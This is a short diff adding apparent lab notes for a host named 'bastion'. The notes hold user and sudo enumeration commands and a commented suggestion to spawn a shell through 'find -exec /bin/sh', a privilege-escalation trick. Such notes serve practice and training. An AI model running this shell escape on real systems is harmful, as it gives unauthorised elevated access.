@@ -1,0 +1,5 @@
+# lab@bastion — Northwind Ops
+whoami
+id
+sudo -l
+# try: find . -exec /bin/sh \; -quit
